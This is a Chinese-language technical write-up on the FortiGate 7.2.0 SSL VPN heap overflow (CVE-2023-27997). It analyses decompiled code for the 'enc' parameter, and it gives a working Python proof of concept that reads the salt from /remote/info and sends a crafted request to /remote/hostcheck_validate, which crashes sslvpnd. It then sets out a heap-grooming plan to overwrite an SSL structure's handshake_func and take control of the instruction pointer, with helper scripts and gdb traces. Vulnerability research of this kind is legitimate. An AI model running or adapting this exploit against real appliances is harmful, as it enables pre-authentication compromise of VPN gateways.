# 环境

FGT: 7.2.0

CPU: 4

# 关键代码分析

```c
__int64 __fastcall sub_164E180(__int64 a1, _QWORD *a2, const char *a3)
{
  int v4; // eax
  int v5; // er8
  int v6; // er9
  __int64 v7; // r13
  char v8; // bl
  int v9; // er8
  int v10; // er9
  signed int v11; // eax
  _BYTE *v12; // rdx
  int v13; // ecx
  __int16 v14; // ax
  int v15; // ecx
  int v16; // er8
  _BYTE *v17; // rdx
  __int64 v18; // r13
  __int64 v19; // r12
  int v20; // ebx
  __int64 v21; // r12
  __int64 result; // rax
  int v23; // [rsp+0h] [rbp-D0h]
  int v24; // [rsp+Ch] [rbp-C4h]
  int v25; // [rsp+Ch] [rbp-C4h]
  _BYTE *v26; // [rsp+10h] [rbp-C0h] BYREF
  __int64 v27; // [rsp+18h] [rbp-B8h] BYREF
  char v28[96]; // [rsp+20h] [rbp-B0h] BYREF
  char v29[24]; // [rsp+80h] [rbp-50h] BYREF
  unsigned __int64 v30; // [rsp+98h] [rbp-38h]

  v30 = __readfsqword(0x28u);
  v4 = strlen(a3);
  v23 = v4;
  v24 = v4;
  if ( v4 <= 11 || (v4 & 1) != 0 )
  {
    sub_166F020(a1, 8, (unsigned int)"enc data length invalid (%d)\n", v4, v5, v6);
    result = 0xFFFFFFFFLL;
  }
  else
  {
    sub_164E490(byte_A782E30, (__int64)a3, 8, (__int64)v29);
    v26 = (_BYTE *)jmalloc(*a2, (v23 >> 1) + 1);
    if ( v26 )
    {
      v7 = 0LL;
      do
      {
        v8 = sub_1676CE0((unsigned int)a3[2 * v7]);
        v26[v7] = sub_1676CE0((unsigned int)a3[2 * v7 + 1]) + 16 * v8;
        ++v7;
      }
      while ( v24 > 2 * (int)v7 );
      v11 = ((unsigned int)(v23 - 1) >> 1) + 1;
      if ( v23 <= 0 )
        v11 = 1;
      v26[v11] = 0;
      v12 = v26;
      v13 = (unsigned __int8)*v26;
      if ( (_BYTE)v13 )
      {
        sub_166F020(a1, 8, (unsigned int)"invalid encoding method %d\n", v13, v9, v10);
        v12 = v26;
      }
      v26 = v12 + 4;
      v14 = *((_WORD *)v12 + 2);
      v15 = (unsigned __int8)(v14 ^ v29[0]);
      BYTE1(v15) = v29[1] ^ HIBYTE(v14);
      v16 = (unsigned __int8)(v14 ^ v29[0]);
      if ( v23 - 5 <= v16 )
      {
        sub_166F020(a1, 8, (unsigned int)"invalid enc data length: %d\n", (unsigned __int8)v14 ^ v29[0], v16, v10);
        result = 1LL;
      }
      else
      {
        v17 = v12 + 6;
        v26 = v17;
        if ( (unsigned __int8)v14 != v29[0] )
        {
          v18 = (unsigned int)(v16 - 1);
          v19 = 0LL;
          v20 = 2;
          while ( 1 )
          {
            v17[v19] ^= v29[v20];
            if ( v18 == v19 )
              break;
            v20 = ((_BYTE)v19 + 3) & 0xF;
            if ( (((_BYTE)v19 + 3) & 0xF) == 0 )
            {
              v25 = v15;
              MD5_Init(v28);
              MD5_Update(v28, v29, 16LL);
              MD5_Final(v29, v28);
              v15 = v25;
            }
            v17 = v26;
            ++v19;
          }
          v17 = &v26[(unsigned __int16)v15];
        }
        *v17 = 0;
        while ( *v26 )
        {
          v27 = sub_1613C90(*a2, &v26, 38LL);
          if ( !v27 )
            break;
          v21 = sub_1613C90(*a2, &v27, 61LL);
          sub_1614FD0(v21, 0LL);
          sub_1614FD0(v27, 0LL);
          sub_15F20A0(*(_QWORD *)(a1 + 744), v21, v27);
        }
        result = 0LL;
      }
    }
    else
    {
      result = 0xFFFFFFFFLL;
    }
  }
  return result;
}
```

### 分段分析

##### 0x00

```
  if ( v4 <= 11 || (v4 & 1) != 0 )
  {
    sub_166F020(a1, 8LL, (__int64)"enc data length invalid (%d)\n", (unsigned int)v4);
    result = 0xFFFFFFFFLL;
  }
```

enc 参数的值的长度必须大于11，且长度为偶数

##### 0x01

```c
sub_164E490(byte_A782E30, (__int64)a3, 8, (__int64)v29);
```

利用salt的值（可以通过/remote/info获取salt的值），enc 参数的值的前8个字节，字符串"GCC is the GNU Compiler Collection."，计算一个md5值。保存到v29。

##### 0x02

```c
__int64 __fastcall sub_15F13D0(__int64 a1, __int64 a2)
{
  _QWORD *v2; // rax
  __int64 v3; // r8
  unsigned __int64 v4; // rbx
  __int64 result; // rax
  unsigned __int64 v6; // r13
  _QWORD *v7; // rax
  __int64 v8; // r8

  v2 = *(_QWORD **)(a1 + 8);
  v3 = v2[2];
  if ( !a2 )
    return 0LL;
  v4 = 8LL * (int)(((unsigned __int64)(a2 - 1) >> 3) + 1);
  if ( *v2 < v3 + v4 )
  {
    v6 = dword_A782904 - 25;
    if ( v6 < v4 )
      v6 = 8LL * (int)(((unsigned __int64)(a2 - 1) >> 3) + 1);
    v7 = (_QWORD *)je_malloc(v6 + 24);
    if ( !v7 )
      sub_15F3F90();
    v7[1] = 0LL;
    v7[2] = v7 + 3;
    *v7 = (char *)v7 + v6 + 24;
    *(_QWORD *)(*(_QWORD *)(a1 + 8) + 8LL) = v7;
    v8 = v7[2];
    *(_QWORD *)(a1 + 8) = v7;
    v7[2] = v8 + v4;
    result = v8;
  }
  else
  {
    v2[2] = v3 + v4;
    result = v3;
  }
  return result;
}
```

```c
 v26 = (_BYTE *)sub_15F13D0(*a2, (v23 >> 1) + 1);
```

根据enc的长度分配一块内存：8*((((strlen(enc)>>1)+1)-1) >> 3+1)+24

##### 0x03

```c
do
{
	v8 = sub_1676CE0((unsigned int)a3[2 * v7]);
	v26[v7] = sub_1676CE0((unsigned int)a3[2 * v7 + 1]) + 16 * v8;
	++v7;
}
```

将enc的值，每两个字节，转换为一个对应的值，如将“1A” 转换为 1a，相当于16进制的两个可打印字符转为，一个对应的一个字节值的,

如：enc="1234567890"  转换后

内存的值为:{18,52,86,120,144}

"12" ==> 18

"34" ==> 52

"56" ==> 86

.....................

##### 0x04

```c
v13 = (unsigned __int8)*v26;
if ( (_BYTE)v13 )
{
	sub_166F020(a1, 8, (unsigned int)"invalid encoding method %d\n", v13, v9, v10);
	v12 = v26;
}
```

enc 开头的前两个字节为"00" , 这样经过转换后v26[0]的值为0

##### 0x05 漏洞点位

```c
v26 = v12 + 4;
v14 = *((_WORD *)v12 + 2);
v15 = (unsigned __int8)(v14 ^ v29[0]);
BYTE1(v15) = v29[1] ^ HIBYTE(v14);
v16 = (unsigned __int8)(v14 ^ v29[0]);
if ( v23 - 5 <= v16 )
{
	sub_166F020(a1, 8, (unsigned int)"invalid enc data length: %d\n", (unsigned __int8)v14 ^ v29[0], v16, v10);
	result = 1LL;
}
```

v16变量为数据的长度，用户可控制，实际分配的内存大小为:((strlen(enc)>>1)+1)，但是这里判断时大于等于(strlen(enc) -5) 才退出



也就是说我们可以越界 ((strlen(enc)>>1)+1) 到 (strlen(enc) -6) 的内容



v16的计算方法为：将enc[8:12]的两个16进制可打印字符（e g:"1a2f" , 占用4个字节），转换为对应的两个字节后(eg:{0x1a,0x2f})，然后异或0x01分析哪里出来的md5值

##### 0x06

```c
        v17 = v12 + 6;
        v26 = v17;
        if ( (unsigned __int8)v14 != v29[0] )
        {
          v18 = (unsigned int)(v16 - 1);
          v19 = 0LL;
          v20 = 2;
          while ( 1 )
          {
            v17[v19] ^= v29[v20];
            if ( v18 == v19 )
              break;
            v20 = ((_BYTE)v19 + 3) & 0xF;
            if ( (((_BYTE)v19 + 3) & 0xF) == 0 )
            {
              v25 = v15;
              MD5_Init(v28);
              MD5_Update(v28, v29, 16LL);
              MD5_Final(v29, v28);
              v15 = v25;
            }
            v17 = v26;
            ++v19;
          }
          v17 = &v26[(unsigned __int16)v15];
        }
        *v17 = 0;
```

首先将enc[12:]每两个字节的16进制字符转换为一个字节后（eg：”1a“--> {26}），与0x01分析哪里出来的md5值的offset 2---15 进行异或，后续用上一轮的md5值，计算一个新的md5值，然后在进行异或，保存到分配的内存中，直到 v16。

最后将v16偏移处的值设置为0

# enc结构分析

```
|---8个字节用于进行第一次的md5值计算，前两个字节必须为“00”---|---4个字节表示后续数据大小---|---data---|
```

经过0x03代码片段，会将enc 每两个字节，转换为一个字节（16进制可打印字符转换，eg：“1a21” --》 {26,33}）

# poc

内存分配测试脚本：

```
#!/usr/bin/python3

for enc_len in range(12,4097,2):
    print("enc_len      : ",enc_len)
    print("alloc_len    : ",(((((enc_len>>1)+1)-1)>>3)+1)*8+24 )
    print("max data len : ",enc_len - 6)
```
enc_len 为发包时enc的长度，alloc_len是分配的内存长度，max data len为用户可指定的内存长度

eg:

```
enc_len      :  4096
alloc_len    :  2080
max data len :  4090
```

```python
#!/usr/bin/python3
import http.client
import ssl
import socket
import re
import urllib.parse
import time
import hashlib

HOST = "192.168.182.188"
PORT = 8443  

REQ_POST = """\
POST %s HTTP/1.1\r
Host: %s:%d\r
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0\r
Content-Type: text/plain;charset=UTF-8\r
Connection: keep-alive\r
Content-Length: %d\r
\r
%s
"""

REQ_GET = """\
GET %s HTTP/1.1\r
Host: %s:%d\r
Connection: keep-alive\r
\r
"""

CIPHERS = "ECDHE-RSA-AES256-SHA@SECLEVEL=0"
context = ssl.create_default_context()
context.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
context.set_ciphers(CIPHERS)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def create_ssl_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    ssl_sock = context.wrap_socket(sock)
    return ssl_sock

def try_read_response(sock) -> bytes:
    """Try to read the response header and contents. If the read() call
    returns an empty byte array, `RuntimeError` is raised. This generally
    indicates that the socket died.
    """

    def read_or_raise(n):
        read = sock.read(n)
        if not read:
            raise RuntimeError(f"Unable to read response headers: {headers}")
        return read

    count = 0
    max_count = 10
    while not (headers := sock.read(1)):
        count += 1
        time.sleep(0.1)
        if count == max_count:
            raise RuntimeError(f"Unable to read response headers: {headers}")

    while b"\r\n\r\n" not in headers:
        headers += read_or_raise(100)

    # TOP tier HTTP parser
    if b"Content-Length: " in headers:
        length = int(re.search(rb"Content-Length: ([0-9]+)", headers).group(1))
        data = headers[headers.index(b"\r\n\r\n") + 4 :]
        while len(data) < length:
            data += read_or_raise(length - len(data))
    elif b"Transfer-Encoding: chunked" in headers:
        data = headers[headers.index(b"\r\n\r\n") + 4 :]
        while not data.endswith(b"\r\n0\r\n\r\n"):
            data += read_or_raise(100)
    else:
        raise RuntimeError(
            f"No Content-Length / Transfer-Encoding headers: {headers}"
        )
    return data

def send_post(sock, path: str, data: dict) -> bytes:
    """Sends a POST request, returns the response."""
    data = urllib.parse.urlencode(data)
    if len(data) > 0x10000:
        failure(f"POST data too big: {hex(len(data))}")
    request = REQ_POST % (path, HOST, PORT, len(data), data)
    # msg_print(request[:-0x1000])
    sock.sendall(request.encode())
    return try_read_response(sock)

def send_get(sock, path: str) -> bytes:
    """Sends a GET request, returns the response."""
    request = REQ_GET % (
            path,
            HOST,
            PORT,
    )
    sock.sendall(request.encode())
    return try_read_response(sock)

def get_salt(sock):
    """Obtains the current salt from the remote server"""
    response = send_get(sock,"/remote/info")
    salt = re.search(rb"salt='(.*?)'", response).group(1).decode()
    return salt

def compute_md5(prefix:bytes,salt):
    """Algorithm to compute the initial MD5 value."""
    assert len(prefix) == 8
    return hashlib.md5(
        salt.encode()
        + prefix.encode()
        + b"GCC is the GNU Compiler Collection."
    ).digest()

def create_test_enc_data(enc_len,salt):
    seed = "00000000"
    init_md5 = compute_md5(seed,salt)
    max_data_len = enc_len - 6
    
    len_hi = (max_data_len >> 8) ^ init_md5[1]
    len_lo = (max_data_len & 0xFF) ^ init_md5[0]
    
    data = b'0' * ((enc_len - 8 - 4)>>1)
    size = bytes((len_lo,len_hi))
    return seed + size.hex() + data.hex()

ssl_socket = create_ssl_socket()
input("Press Enter to send the HTTP request...")

salt = get_salt(ssl_socket)
print("salt: ",salt)

enc = create_test_enc_data(40960,salt)

send_post(ssl_socket,"/remote/hostcheck_validate",{"enc":f"{enc}"})
```

该poc构造一个恶意的enc数据， 造成越界写，从而会造成sslvpnd进程崩溃。

```
enc_len      :  40960
alloc_len    :  20512
max data len :  40954
```

首先我们实际的enc数据长度为40960，分配的内存长度为20512，但是我们越界写20512 --- 40954，从而造成sslvpnd进程崩溃

通过gdb分析：

```
Breakpoint 2, 0x00000000015f143b in ?? ()
(gdb) print $rdi
$1 = 20512
```

这是实际分配的内存确实为20512

Max data Len:

```
Breakpoint 3, 0x000000000164e2b7 in ?? ()
(gdb) print $cx
$2 = -24582
(gdb) print $rcx
$3 = 40954
(gdb) 
```

与计算的符合

# exp

思路：0x06代码片段中，会将v16（用户可控制的数据长度字段）偏移处的值设置为0

0 异或 任意一个数都为 该数本身。首先第一次时，设置v16为指定的偏移，将该偏移的值设置为0，然后v16+1异或一个我们需要的值，这样就能做到写入任意数据，而v16之前的数据经过两次异或会保持不变，并不会对以前的数据造成影响

SSL 结构体在 FGT 7.2.0中的大小为0x1888 ，实际会给他分配 7kb的内存大小。

首先创建大量的SSL结构体，然后在释放一个中间位置的SSL结构体。在通过控制enc参数，占用释放掉的SSL结构体的位置，通过任意写，修改挨着的SSL结构体的handshake_func函数，从而控制rip。

为了保证分配7kb的内存，我们的enc长度需要为：14272(0x37c0)

```python
#!/usr/bin/python3

def calc_enc(enc_len,need_len):
    alloc_len = (((((enc_len>>1)+1)-1)>>3)+1)*8+24
    max_data_len = enc_len - 6
    if need_len == alloc_len:
        return True
    else:
        return False

for i in range(12,65535,2):
    if calc_enc(i,0x1c00):
        print("enc_len: ",i)
        break
```

### sslvpn 处理相关的流程

对于N个CPU的FGT设备(N为偶数)，分析可以发现，其会创建N个sslvpnd，有一个sslvpnd 会专门监听用户的连接请求，然后将该请求通过unix域套节字传递给另外的 (N-1)中的一个sslvpnd进行处理。通过大量请求发现，貌似使用轮询的方式选中（N-1）中的一个。

如何有效的保证我们用来执行越界写的enc分配的内存 与释放掉的SSL 结构体在同一个sslvpnd进程中，且位于SSL结构体的前面呢？

当有2个CPU时，只有一个sslvpnd进行数据处理，我们可以通过分配大量的SSL结构体，然后释放掉中间两个，

当有4个CPU时，会有3个sslvpnd进行数据处理，我们需要通过请求分配 3*M（M》3）个SSL结构体。先假设 M 为 6:，那么sslvpnd进程0有SSL结构体编号：0，3，6，9，12，15.......，那么sslvpnd进程1有SSL结构体编号：1，4，7，10，13，16..........，那么sslvpnd进程2有SSL结构体编号：2，5，8，11，14，17........。释放掉3，4，5，6，7，8，9，10，11然后在连续申请3个attack_sock，此时，这三个attack_sock 分配处于三个sslvpnd进程中，他们的SSL结构体的编号为9，10，11。再申请三个victim_sock，他们的SSL结构体的编号为6，7，8。当attack_sock申请enc内存时，会占用SSL结构体的编号为3，4，5。这样可以越界写6，7，8 SSL 结构体中的handshake_func 函数。



通过gdb脚本查看ssl结构体分配情况，以及enc 内存分配情况：

```
handle SIGPIPE nostop
break *SSL_new + 0x35
commands
    printf "ssl alloc addr:%x",$rax 
    continue
end

break *0x000000000164E1FE 
commands
    printf "enc alloc addr:%x",$rax 
    continue
end
```

通过大量发包，分析：

```
ssl alloc addr:ff41000
Breakpoint 1, 0x00007f07155d8935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:ff3e400
Breakpoint 2, 0x000000000164e1fe in ?? ()
enc alloc addr:ff3c818
```

ff41000 为 attack_sock，ff3e400 为 victim_sock，ff3c818 为 enc 分配的内存，相差都在7K(0x1c00)，为什么 enc 分配的内存多了0x18呢？因为在处理enc参数的函数，进行内存分配后，会将内存地址加0x18在返回。



# 资料

XORtigate: Pre-authentication Remote Code Execution on Fortigate VPN (CVE-2023-27997)

https://blog.lexfo.fr/xortigate-cve-2023-27997.html

xortigate-cve-2023-27997

https://github.com/lexfo/xortigate-cve-2023-27997

Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN

https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/#:~:text=HTTP%20server: